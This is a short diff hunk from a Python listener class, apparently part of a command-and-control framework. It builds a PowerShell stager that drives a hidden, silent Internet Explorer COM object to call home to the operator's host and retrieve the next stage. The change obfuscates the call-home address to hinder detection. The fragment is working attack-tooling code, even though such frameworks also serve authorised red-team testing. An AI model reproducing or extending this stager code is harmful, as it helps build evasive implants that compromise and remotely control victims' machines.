@@ -318,7 +318,7 @@ class Listener:
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
+                stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
 
                 # add the RC4 packet to a header location
                 stager += "$c=\"%s: %s" % (requestHeader, b64RoutingPacket)
